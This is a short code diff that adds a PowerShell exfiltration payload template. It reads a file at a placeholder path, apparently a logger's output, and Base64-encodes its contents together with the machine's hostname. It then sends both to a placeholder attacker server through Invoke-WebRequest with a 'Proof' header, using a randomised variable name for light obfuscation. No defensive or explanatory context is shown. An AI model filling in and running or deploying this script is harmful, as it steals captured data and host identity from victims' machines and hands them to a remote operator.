@@ -1,0 +1,2 @@
+function Encode64{param($Text);if($null -eq $Text){return "IA=="}else{$Bytes=[System.Text.Encoding]::Unicode.GetBytes($Text);$EncodedText=[Convert]::ToBase64String($Bytes);return $EncodedText}};$gmFbduETDl='OUTPUT_PATH';$logger=Encode64(cat $gmFbduETDl 2>$null);
+$URL='SERVER_PROTOCOL://SERVER_EXTERNAL_IP:SERVER_EXTERNAL_PORT/?';$hostname=Encode64(hostname);$params=@{hostname=$hostname;logger=$logger};$headers=@{'Proof'='1'};Invoke-WebRequest -Uri $URL -Headers $headers -Method GET -Body $params;
